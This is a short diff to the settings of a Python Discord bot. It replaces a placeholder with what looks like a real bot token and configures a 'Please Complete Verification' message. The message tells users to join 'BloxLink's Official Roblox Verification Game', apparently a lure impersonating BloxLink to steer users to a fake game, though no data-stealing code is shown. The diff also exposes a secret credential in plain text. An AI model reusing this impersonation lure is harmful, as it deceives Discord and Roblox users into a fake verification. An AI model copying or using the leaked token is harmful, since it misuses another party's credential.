@@ -4,7 +4,7 @@ from discord.ext import commands
 intents = discord.Intents.all()
 
 # Settings (Change these to whatever you want)
-token = "YOUR_BOT_TOKEN"
+token = "MTQwNTM0OTM4OTcwMjEzOTkzNQ.GeFzKx.sKfLy1kWYYkMU9RQ8JHY-ya5yhziA-O4oMzFdU"
 prefix = "!"
 title = "Please Complete Verification"
 desc = "To verify your account, please join BloxLink's Official Roblox Verification Game"
